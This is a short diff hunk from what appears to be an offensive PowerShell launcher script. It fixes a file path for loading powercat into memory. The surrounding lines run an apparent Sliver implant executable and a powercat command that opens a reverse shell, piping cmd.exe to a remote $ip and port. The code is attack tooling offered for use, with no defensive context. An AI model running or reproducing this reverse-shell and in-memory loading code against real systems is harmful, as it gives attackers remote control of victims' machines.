@@ -111,7 +111,7 @@
                 & ./sliver8000.exe
              }
              'Powercat' {
-                Load-ScriptItemInMemory -item 'tools/powercat.ps1.exe'
+                Load-ScriptItemInMemory -item 'tools/powercat.ps1'
                 powercat -c $ip -p -$port -e cmd.exe
              }
         }
